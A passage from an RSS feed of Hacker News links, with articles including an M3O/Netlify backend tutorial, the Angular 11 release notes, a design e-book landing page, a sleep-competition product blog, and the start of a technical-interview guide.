<p>Check they’re running using <code>micro status</code>. You should see the status progress through starting, building and running. 
If you want to see logs or anything related just do <code>micro logs posts</code> and the same for any other service by name.</p>

<h3 id="write-a-post-on-the-cli">Write a post on the CLI</h3>

<p>Once services are running they become immediately callable via the CLI as dynamic commands.</p>

<p>Save a quick post:</p>

<div><div><pre><code>micro posts save <span>--id</span><span>=</span>1 <span>--title</span><span>=</span><span>"My first post"</span> <span>--content</span><span>=</span><span>"This is pretty epic"</span>
</code></pre></div></div>

<p>List posts:</p>



<p>The same calls can be made over the API too, just have to know your namespace:</p>

<h3 id="call-it-via-the-http-api">Call it via the HTTP API</h3>

<p>Now here’s where it gets cool and more importantly what you’ll be calling from your frontend apps 
running on Netlify. First grab your namespace like earlier.</p>

<div><div><pre><code><span>$ </span>micro user namespace
random-example-namespace
</code></pre></div></div>

<p>Now just curl it like any other api</p>

<div><div><pre><code><span>$ </span>curl <span>-H</span> <span>"Micro-Namespace: random-example-namespace"</span> https://api.m3o.dev/posts/query
<span>{</span>
  <span>"posts"</span>: <span>[</span>
    <span>{</span>
      <span>"id"</span>: <span>"1"</span>,
      <span>"title"</span>: <span>"My first post"</span>,
      <span>"slug"</span>: <span>"my-first-post"</span>,
      <span>"content"</span>: <span>"This is pretty epic"</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The generic <code>api.m3o.dev</code> url requires us to pass in our namespace so we query our own service but 
every namespace also gets its own unique URL so you don’t have to worry about this in your frontend 
code. Just compose namespace + m3o.dev as <code>random-example-namespace.m3o.dev</code>.</p>

<div><div><pre><code><span>$ </span>curl https://random-example-namespace.m3o.dev/posts/query
<span>{</span>
  <span>"posts"</span>: <span>[</span>
    <span>{</span>
      <span>"id"</span>: <span>"1"</span>,
      <span>"title"</span>: <span>"My first post"</span>,
      <span>"slug"</span>: <span>"my-first-post"</span>,
      <span>"content"</span>: <span>"This is pretty epic"</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>That’s it! We now have the backend for our frontend running on M3O.</p>

<p>Let’s deploy the sample frontend to Netlify just for kicks.</p>

<h2 id="deploying-the-frontend-to-netlify">Deploying the frontend to Netlify</h2>

<p>The frontend is a simple angular app we’ve put together to validate the premise:</p>

<p><strong>Netlify for the frontend, Micro for the backend</strong></p>

<p>You can find the code in <a href="https://github.com/m3o/blog-frontend">github.com/m3o/blog-frontend</a> but 
we’ll walk you through the install now. The deploy settings for the site hosted under 
<a href="https://loving-goodall-44ee08.netlify.app/">loving-goodall-44ee08.netlify.app</a> are as follows:</p>

<h3 id="build-settings">Build settings</h3>

<center>
<img src="https://blog.m3o.com/assets/images/deploysettings.png">
</center>

<p><br>
You can copy the below settings for ease of use. Where you see ‘concert-celtic-uncover’ replace it with your namespace from <code>micro user namespace</code> on the CLI. 
We need this to know what backend API to call.</p>

<div><div><pre><code>Repository        github.com/m3o/blog-frontend
Base directory    Not set
Build command     sed -i 's/micro/concert-celtic-uncover/g' ./src/environments/environment.prod.ts &amp;&amp; ng build --prod &amp;&amp; cp ./src/assets/_redirects ./dist/blog-frontend
Publish directory dist/blog-frontend
</code></pre></div></div>

<p>As you can see, it’s the original <code>m3o/blog-frontend</code> being deployed in the example, but in your case <code>m3o</code> will be replaced with your fork. 
This is because Netlify asks for the permissions to the repo.</p>

<p>The build command is a bit involved, here is what it’s doing:</p>

<div><div><pre><code><span># Replace the micro namespace with your own</span>
<span>namespace</span><span>=</span><span>$(</span>micro user namespace<span>)</span>

<span>sed</span> <span>-i</span> <span>"s/micro/</span><span>$namespace</span><span>/g"</span> ./src/environments/environment.prod.ts

<span># It's an angular app, so we have to ng build</span>
ng build <span>--prod</span>

<span># Single page …</span></code></pre></div></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html</a></em></p>]]>
            </description>
            <link>https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068782</guid>
            <pubDate>Thu, 12 Nov 2020 11:44:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Angular 11]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 190 (<a href="https://news.ycombinator.com/item?id=25068668">thread link</a>) | @amitport
<br/>
November 12, 2020 | https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7 | <a href="https://web.archive.org/web/*/https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@markathompson?source=post_page-----74721b7952f7--------------------------------" rel="noopener"><img alt="Mark Techson" src="https://miro.medium.com/fit/c/96/96/1*2hqK0rVXWghtk_RLFx33oA.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Photo of a Torch Ginger by Jules Kremer" src="https://miro.medium.com/max/2368/0*55kr1t601sp22pkE" width="1184" height="1091" srcset="https://miro.medium.com/max/552/0*55kr1t601sp22pkE 276w, https://miro.medium.com/max/1104/0*55kr1t601sp22pkE 552w, https://miro.medium.com/max/1280/0*55kr1t601sp22pkE 640w, https://miro.medium.com/max/1400/0*55kr1t601sp22pkE 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*55kr1t601sp22pkE?q=20"></p></div></div></div><figcaption>Photo of a Torch Ginger by Jules Kremer</figcaption></figure><p id="1feb"><strong>Welcome to the Angular version 11 release.</strong></p><p id="1877">Version 11.0.0 is here and we’ve got some great updates for Angular developers everywhere. This release has updates across the platform including the framework, the CLI and components. Let’s dive in!</p><h2 id="1182">Updates on Operation Byelog</h2><p id="593b">When we shared <a href="https://angular.io/guide/roadmap" rel="noopener">Angular’s Roadmap</a>, one of the items was Operation Byelog where we committed to putting a significant engineering effort towards triaging issues and PRs until we have a clear understanding of the broader community needs. We can now report that the original goal is complete! We’ve triaged all the issues in all three of the monorepos and will continue this as an ongoing effort as new issues get reported.</p><p id="bc06">This is our commitment: Going forward all new issues reported will be triaged within 2 weeks.</p><p id="2104">In the process, we resolved a few <a href="https://github.com/angular/angular/issues/12842" rel="noopener">popular</a> <a href="https://github.com/angular/angular/issues/18469" rel="noopener">issues</a> in the <a href="https://github.com/angular/angular/issues/13011" rel="noopener">router</a> and <a href="https://github.com/angular/angular/issues/14542" rel="noopener">forms</a>.</p><p id="a1cd">Also, we’ve closed the <a href="https://github.com/angular/angular/issues/11405" rel="noopener"><em>third most popular issue</em></a><em>!</em></p><p id="5773">Now, we’re planning the next steps to support the Angular community. We’ll continue triaging and fixing issues, and work towards improving our processes for accepting community contributions.</p><h2 id="4683">Automatic Inlining of Fonts</h2><p id="6a67">To make your apps even faster by speeding up their <a href="https://web.dev/first-contentful-paint/" rel="noopener">first contentful paint</a>, we’re introducing automatic font inlining. During compile time Angular CLI will download and inline fonts that are being used and linked in the application. We enable this by default in apps built with version 11. All you need to do to take advantage of this optimization is update your app!</p><h2 id="124e">Component Test Harnesses</h2><p id="78d2">In Angular v9 we introduced Component Test Harnesses. They provide a robust and legible API surface to help with testing Angular Material components. It gives developers a way to interact with Angular Material components using the supported API during testing.</p><p id="2932">Releasing with version 11, we have harnesses for all of the components! Now developers can create more robust test suites.</p><p id="3e07">We’ve also included performance improvements and new APIs. The <em>parallel</em> function makes working with asynchronous actions in your tests easier by allowing developers to run multiple asynchronous interactions with components in parallel. The <em>manualChangeDetection</em> function gives developers access to finer grained control of change detection by disabling automatic change detection in unit tests.</p><p id="752c">For more details and examples of these APIs and other new features, be sure to check out the <a href="http://material.angular.io/cdk/test-harnesses/overview" rel="noopener">documentation for Angular Material</a> Test Harnesses!</p><h2 id="173a">Improved Reporting and Logging</h2><p id="968c">We’ve made changes to the builder phase reporting to make it even more helpful during development. We are bringing in new CLI output updates to make logs and reports easier to read.</p><figure><div><div><p><img alt="Screenshot of angular CLI output nicely formatted into columns." src="https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX" width="607" height="355" srcset="https://miro.medium.com/max/552/0*-dCa80651cnfbjpX 276w, https://miro.medium.com/max/1104/0*-dCa80651cnfbjpX 552w, https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX 607w" sizes="607px" data-old-src="https://miro.medium.com/max/60/0*-dCa80651cnfbjpX?q=20"></p></div></div><figcaption>Improved CLI output formatting</figcaption></figure><h2 id="970e">Updated Language Service Preview</h2><p id="650a">The Angular Language Service provides helpful tools to make development with Angular productive and fun. The current version of the language service is based on View Engine and today we’re giving a sneak peek of the Ivy-based language service. The updated language service provides a more powerful and accurate experience for developers.</p><p id="15e6">Now, the language service will be able to correctly infer generic types in templates the same way the TypeScript compiler does. For example, in the screenshot below we’re able to infer that the iterable is of type string.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Screenshot of intellisense style insights in Angular templates." src="https://miro.medium.com/max/3000/0*L1Tg13gdu3PCqUNN" width="1500" height="902" srcset="https://miro.medium.com/max/552/0*L1Tg13gdu3PCqUNN 276w, https://miro.medium.com/max/1104/0*L1Tg13gdu3PCqUNN 552w, https://miro.medium.com/max/1280/0*L1Tg13gdu3PCqUNN 640w, https://miro.medium.com/max/1400/0*L1Tg13gdu3PCqUNN 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*L1Tg13gdu3PCqUNN?q=20"></p></div></div></div><figcaption>Angular Language Service inferring iterable types in templates</figcaption></figure><p id="e67f">This powerful new update is still in development but we wanted to share an update as we keep preparing it for a full release in an upcoming version.</p><h2 id="48a5">Updated Hot Module Replacement (HMR) Support</h2><p id="303f">Angular has offered support for HMR but enabling it required configuration and code changes making it less than ideal to quickly include in Angular projects. In version 11 we’ve updated the CLI to allow enabling HMR when starting an application with ng serve. To get started, run the following command:</p><pre><span id="3ac4">ng serve --hmr</span></pre><p id="f3bc">After the local server starts the console will display a message confirming that HMR is active:</p><p id="f521">NOTICE: Hot Module Replacement (HMR) is enabled for the dev server.</p><p id="5155">See <a href="https://webpack.js.org/guides/hot-module-replacement" rel="noopener">https://webpack.js.org/guides/hot-module-replacement</a> for information on working with HMR for webpack.</p><p id="3796">Now during development the latest changes to components, templates and styles will be instantly updated into the running application. All without requiring a full page refresh. Data typed into forms are preserved as well as scroll position providing a boost to developer productivity.</p><h2 id="6de3">Faster Builds</h2><p id="630c">We’re bringing a faster development and build cycle by making updates to some key areas.</p><ul><li id="4336">When installing dependencies, the ngcc update process is now 2–4x faster.</li><li id="b30d">Faster compilation with TypeScript v4.0.</li></ul><p id="ed18">Now, teams can opt-in to webpack v5. Currently, you could experiment with <a href="https://webpack.js.org/concepts/module-federation/" rel="noopener">module federation</a>. In the future, webpack v5 will clear the path for:</p><ul><li id="db89">Faster builds with persistent disk caching</li><li id="7ab4">Smaller bundles thanks to <a href="https://webpack.js.org/guides/tree-shaking/" rel="noopener">cjs tree-shaking</a></li></ul><p id="dae8">Support is experimental and under development so we don’t recommend opting in for production uses.</p><p id="4ca8">Want to try out webpack 5? To enable it in your project, add the following section to your package.json file:</p><pre><span id="386c">"resolutions": {<br>     "webpack": "5.4.0"<br>}</span></pre><p id="65a0">Currently, you’ll need to use <strong>yarn</strong> to test this as npm does not yet support the resolutions property.</p><h2 id="d0a9">Linting</h2><p id="e4b2">In previous versions of Angular, we’ve shipped a default implementation for linting (TSLint). Now, TSLint is deprecated by the project creators who recommend migration to ESLint. <a href="https://twitter.com/mrjameshenry" rel="noopener">James Henry</a> together with other folks from the open-source community developed a third-party solution and migration path via <a href="https://github.com/typescript-eslint/typescript-eslint" rel="noopener">typescript-eslint</a>, <a href="https://github.com/angular-eslint/angular-eslint" rel="noopener">angular-eslint</a> and <a href="https://github.com/typescript-eslint/tslint-to-eslint-config" rel="noopener">tslint-to-eslint-config</a>! We’ve been collaborating closely to ensure a smooth transition of Angular developers to the supported linting stack.</p><p id="6071">We’re deprecating the use of TSLint and Codelyzer in version 11. This means that in future versions the default implementation for linting Angular projects will not be available.</p><p id="806d">Head over to the <a href="https://github.com/angular-eslint/angular-eslint#migrating-from-codelyzer-and-tslint" rel="noopener">official project page</a> for a guide to incorporate angular-eslint in a project and migrate from TSLint.</p><h2 id="98a6">Housekeeping</h2><p id="0727">In this update we’re removing support for IE9/IE10 and IE mobile. IE11 is the only version of IE <a href="https://angular.io/guide/browser-support" rel="noopener">still supported</a> by Angular. We’ve also <a href="https://angular.io/guide/deprecations" rel="noopener">removed deprecated APIs</a> and added a few to the deprecation list. Be sure to check this out to make sure you are using the latest APIs and following our recommended best practices.</p><h2 id="a3c7">Roadmap</h2><p id="9aad">We’ve also updated the <a href="https://angular.io/guide/roadmap" rel="noopener">roadmap</a> to keep you posted on our current priorities. Some of the announcements in this post are updates on in-progress projects from the roadmap. This reflects our approach to incrementally rollout larger efforts and allows developers to provide early feedback that we can incorporate it into the final release.</p><p id="8c07">We collaborated with <a href="https://twitter.com/simpulton" rel="noopener">Lukas Ruebbelke</a> from the Angular community on updating the content of some of the projects to better reflect the value they provide to developers.</p><h2 id="6939">How to update to get version 11</h2><p id="0170">When you are ready to go run this command to update Angular and CLI:</p><pre><span id="5983">ng update @angular/cli @angular/core</span></pre><p id="ac5f">Head over to <a href="https://update.angular.io/" rel="noopener">update.angular.io</a> to find detailed information and guidance on updating. We always recommend upgrading one major release at a time to have the best update experience.</p><p id="732f">We hope you enjoy this feature update and be sure to let us know what you think here or on <a href="https://twitter.com/angular" rel="noopener">Twitter</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068668</guid>
            <pubDate>Thu, 12 Nov 2020 11:19:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux Laptop Reviews]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068348">thread link</a>) | @manuanuragck
<br/>
November 12, 2020 | https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267 | <a href="https://web.archive.org/web/*/https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068348</guid>
            <pubDate>Thu, 12 Nov 2020 10:15:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Essential Guide to Design Strategy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068234">thread link</a>) | @mmanja
<br/>
November 12, 2020 | https://designstrategy.guide/the-ultimate-design-strategy-e-book/ | <a href="https://web.archive.org/web/*/https://designstrategy.guide/the-ultimate-design-strategy-e-book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">

	
	

	
	<main id="main">
<div id="content" role="main">
	<div>
		<div>
			<div>
				
				
														
							<section id="section_1544488248">
		

		<div>
			
<div>
<p><img src="https://designstrategy.guide/wp-content/uploads/2020/03/white-layer.png"><br>
<img src="https://designstrategy.guide/wp-content/uploads/2020/10/bg-blurb.png"></p>
<div id="row-1394989321">

	

	

	<div id="col-1221132061">
		<div>
			
			
<h3>The Ultimate Design Strategy e-book</h3>
<p>Learn how to leverage design strategy to increase ROI, enhance your design’s value and much more.</p>
<p><a rel="noopener noreferrer" href="https://designstrategy.mykajabi.com/pl/237579" target="_blank">
    <span>CLAIM YOUR FREE COPY</span>
  </a>

		</p></div>
			</div>

	

	

	


</div>
		</div>

		

	</div></section>
	
	<section id="section_1470156449">
		

		<div>
			
	<div>

		<div>
						<p><img width="1200" height="890" src="https://designstrategy.guide/wp-content/uploads/2020/11/Ipad-with-hand-small.gif" alt="DesignStrategyEbook" loading="lazy">											</p>
					</div>

		
	</div>
	
<div id="row-824835946">

	<div id="col-1620115455">
		<div>
			
			
	<div id="image_1975975887">
								<p><img width="1020" height="427" src="https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-1024x429.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-1024x429.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-300x126.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-768x322.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-600x251.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white.png 1181w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1380471527">

	<div id="col-77338758">
		<div>
			
			
<h2>Why am I giving<br>you this eBook for free?</h2>
<p>Plenty of designers and product managers feel lost and frustrated while trying to prove their product design’s value and making a tangible impact. I will show you how to leverage design strategy to raise your profit.</p>
<p>I BELIEVE THAT THERE ARE 4 THINGS TO FOCUS ON:</p>
		</div>
			</div>

	
</div>

<div id="row-1359045577">

	

	

	<div id="col-594240732">
		<div>
			
			
<p>Embrace your<br>metrics and KPIs</p>

		</div>
			</div>

	


</div>
<div id="row-1539188345">

	<div id="col-1658691325">
		<div>
			
			
	<div id="image_734430800">
								<p><img width="1020" height="505" src="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-300x148.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-768x380.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-600x297.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1.png 1144w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1902530723">

	<div id="col-73122831">
		<div>
			
			
<h3><img loading="lazy" src="https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL.png" alt="The Design Strategy E-book" width="325" height="462" srcset="https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL.png 500w, https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL-211x300.png 211w" sizes="(max-width: 325px) 100vw, 325px"></h3>
<h3><span>Why and how? </span></h3>
<p><span>That’s what I unpack in the ebook.</span></p>
<p>It’s a bull***-free guide that’ll help you to create your design strategy, raise your conversion rates and implement better processes.</p>
		</div>
			</div>

	
</div>
<div id="row-155738487">

	<div id="col-322677844">
		<div>
			
			
	<div id="image_1296755638">
								<p><img width="1020" height="445" src="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-300x131.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-768x335.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-600x262.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white.png 1199w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-475697274">

	<div id="col-469839691">
		<p>
			
			
<h2>Goodies that come with this book</h2>
		</p>
			</div>

	
</div>
<div id="row-1476958003">

	

	

	<div id="col-433931759">
		<p>Research diagrams and insights</p>
		

	</div>

	
</div>
<div id="row-1831873484">

	

	

	<div id="col-43611081">
		<p>Links that’ll expand your knowledge</p>
		

	</div>

	
</div>

<div id="row-1720399207">

	<div id="col-1340190748">
		<div>
			
			
	<div id="image_821173891">
								<p><img width="1020" height="505" src="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-300x148.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-768x380.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-600x297.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1.png 1144w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	
	<section id="section_342405145">
		

		<div>
			

<div id="row-880530126">

	<div id="col-972708430">
		<div>
			
			
<p><span>It is an eye-opener for every designer.<br>
</span></p>
<p><span>Claudia, UX designer</span></p>
		</div>
			</div>

	

	

	

	<div id="col-903571570">
		<div>
			
			
<p><span>Too many startups fail because they don’t know which part they need to focus on (UX, dev, design). This e-book showed me new methods that I need to try out. </span></p>
<p><span>Jessica, Project Manager</span></p>
		</div>
			</div>

	
</div>
	
	
<div id="row-1703618986">

	<div id="col-1034711458">
		<div>
			
			
<p><span>This book challenged my knowledge and showed me how and where to level up my design knowledge. Romina, thanks for choosing me to be part of your UX testing group. Plus, the design is just wow.<br></span></p>
<p><span>Monika, CMO</span></p>
		</div>
			</div>

	

	

	

	<div id="col-448989967">
		<div>
			
			
<p><span>Now I know how to choose Design metrics. 🙂</span></p>
<p><span>Sara, Front-End Developer</span></p>
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	
	<section id="section_1908445562">
		

		<div>
			
<div id="row-876475510">

	<div id="col-542296828">
		<div>
			
			
	<div id="image_985780315">
								<p><img width="1020" height="445" src="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-300x131.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-768x335.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-600x262.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white.png 1199w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1508630950">

	<div id="col-881547372">
		<div>
			
			
<h3><span>Meet the author</span></h3>
	
	
<div id="row-1746420623">

	<div id="col-584313438">
		<div>
			
			
	<div id="image_744786227">
								<p><img width="682" height="1024" src="https://designstrategy.guide/wp-content/uploads/2020/11/03-682x1024.jpg" alt="Romina Kavcic Websi 2020" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/11/03-682x1024.jpg 682w, https://designstrategy.guide/wp-content/uploads/2020/11/03-200x300.jpg 200w, https://designstrategy.guide/wp-content/uploads/2020/11/03-768x1152.jpg 768w, https://designstrategy.guide/wp-content/uploads/2020/11/03-1024x1536.jpg 1024w, https://designstrategy.guide/wp-content/uploads/2020/11/03-600x900.jpg 600w, https://designstrategy.guide/wp-content/uploads/2020/11/03.jpg 1141w" sizes="(max-width: 682px) 100vw, 682px">						
					</p>
								

	</div>
	
		</div>
			</div>

	

	

	

	<div id="col-392514621">
		<p><span>Romina is an award-winning Design Strategist who holds a Master of Business Administration. She has 15+ years of career experience in design work and consulting across both tech startups and several marquee tech unicorns such as Stellar.org, Outfit7, Databox, Xamarin, Chipolo, Singularity.NET, etc. She is currently advising, coaching and consulting with companies on design strategy &amp; management, visual design and user experience. Her work has been published on Forbes, Hackernews, Blockgeeks, Newsbtc, Bizjournals, and featured on Apple Store.</span></p>
			</div>

	
</div>
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	

						
												</div>
		</div>
	</div>
</div>


</main><!-- #main -->

<!-- .footer-wrapper -->

</div></div>]]>
            </description>
            <link>https://designstrategy.guide/the-ultimate-design-strategy-e-book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068234</guid>
            <pubDate>Thu, 12 Nov 2020 09:55:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Neurohacking the World Sleep Championships]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068156">thread link</a>) | @pedalpete
<br/>
November 12, 2020 | https://soundmind.co/blog/neurohacking-the-world-sleep-championships | <a href="https://web.archive.org/web/*/https://soundmind.co/blog/neurohacking-the-world-sleep-championships">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e2b9e06d42ac6600e580"><div><p>I’m the last person you’d expect to compete in the <a href="https://www.worldsleepchampionships.com/">World Sleep Championships</a>. A life-long insomniac with Central Sleep Apnea, I’ve spent the last 10 months diving into the latest in neuroscience research with the goal of not only helping insomnia sufferers, but improving Sleep Performance for the greater population.&nbsp;</p><p>The competition used the data from Oura rings which classifies sleep as REM, light or deep, and factors in the number of hours you slept, how quickly you fell asleep, and how much time you spent in each sleep state.&nbsp;</p><h3>More people have died in their sleep than during any other activity, making this the most dangerous and extreme competition that has ever taken place! </h3><p>The organizers of the World Sleep Championships decided on a tournament type structure for the competition. We started with the seeding process to get our baseline sleep data, and build the competition tree. Seeding was followed by 5 alternating nights of head-to-head competition where the highest score for each pair of competitors made it through to the next round .</p><p>The only rule was that we couldn’t take sleeping pills, everything else was fair game. Rumour had it that sleep deprivation on non-competition nights was the strategy of choice for many competitors.</p><h3>I didn’t stoop to such tactics, instead relying on the SoundMind prototype to guide me through the competition.</h3><p>It started off very well, when I averaged the 2nd highest scores through seeding, and managed the 2nd highest score of 92 points on the first night of competition<br></p><p>I believed Oura was removing points for a low amount REM sleep as a percentage of my overall sleep, so I made an adjustment to the sounds played by SoundMind to promote more REM sleep. I had a hint that this would work, but, it was a bit like running a marathon in a new pair of sneakers. A wrong move and my competition would be over.</p><p>My competitor that night put in a very solid score of 93, and apparently began his celebrations early, before seeing the 96 points I achieved with the updated version of SoundMind. This turned out to be the highest score of the entire tournament.</p><p>This was followed-up by a score of 95 the next night of competition. Far above my pre-SoundMind average in the low 70s.</p><p>Going into the semi-finals, a win looked unlikely. At 2am, somebody rang the buzzer at my apartment, it was a food delivery guy who had the wrong address. When the buzzer rang a 2nd time at 2:30am, I was wondering if this was a new tactic my opponent had discovered as the only way to destroy my sleep and chances at winning the night. Waking up, I felt pretty good, but didn’t know if I’d have the high score to win with only 89 points. However, potentially my opponent's guilt over interfering in my sleep, if she actually had done this, kept her awake fretting, and I had a few points lead over her, which led me into the finals.</p><p>I felt confident going into the finals. Not only because of the high scores I had been seeing, but due to the consistency. Anybody can have one or two nights of great sleep, but to consistently be able to sleep great every night, that’s the real challenge, and also why the competition rewards the person who can get the high score night after night.</p><div><p>Potentially with a bit of nerves coming into play, I only managed to eke out a 93 on the final night, and I wasn’t sure if that would be enough to take the win from a man with a history of scoring in the low 90s. To add to the suspense, the competition takes place around the world, and living in Australia, we’re the 2nd country to be awake, so I had to wait a day to get the final results!</p><p>It was a close final, but I managed to win out by a mere 2 points! Though I don’t feel a strong need to give an acceptance speech or thank my sponsors, I do want to thank Damian and Todd for organizing the event, and to all my fellow competitors. </p><p>The most important result here for me is that we had a fun way to test out the SoundMind tech, and see it in action as more than just another score or another great night sleep. As I’ve been using SoundMind it’s been interesting to see how quickly I’ve adapted to just accepting that a good night sleep is what happens. I almost forget what it was like being awake all night, and the agony which comes with that.&nbsp;</p></div><p>We’ll have more updates, and be sharing more data as we progress, and sign-up to the wait list to reserve your spot and get one of the first headbands so you can have amazing sleep too!</p><p>Soon we’ll all be sleeping well with SoundMind.</p></div></div></div>]]>
            </description>
            <link>https://soundmind.co/blog/neurohacking-the-world-sleep-championships</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068156</guid>
            <pubDate>Thu, 12 Nov 2020 09:40:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Acing your technical interview – a hiring manager’s guide]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067800">thread link</a>) | @ochronus
<br/>
November 12, 2020 | https://ochronus.online/acing-the-tech-interview/ | <a href="https://web.archive.org/web/*/https://ochronus.online/acing-the-tech-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-605" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">

<p>Even though interviewing for a software engineering job can be intimidating and frustrating (with whiteboard exercises, remote coding challenges, and even full days of onsite interviews), it’s a lot easier when you know what to expect and are well-prepared.</p>
<p>I’ve interviewed a few hundred software engineering candidates in the past 10+ years and designed hiring processes. My experience is limited to startups and mid-sized companies, so take everything you read here with that in mind. My advice may not get you into <a href="https://www.facebook.com/careers/facebook-life/how-we-hire" target="_blank" rel="noopener">Facebook</a> or <a href="https://careers.google.com/how-we-hire/" target="_blank" rel="noopener">Google</a> but will definitely increase your chances at mid-sized companies with a good culture!</p>
<p>In the first part of this article, I’ll give some context, then give you an actionable list to improve your experience and chances in your next interview</p>
<p>If you’re only interested in the actionable list, feel free to skip ahead to it.</p>

<h2 id="what-you-think-about-the-technical-interview-might-be-incomplete"><span id="What_you_think_about_the_technical_interview_might_be_incomplete">What you think about the technical interview might be incomplete</span></h2>
<p>First and foremost, a technical interview is almost never only technical. Up to a certain (and honestly, very useful!) level growing as a ‘coder’ is not that complicated. Many candidates perform pretty well if we purely look at their coding skills.</p>
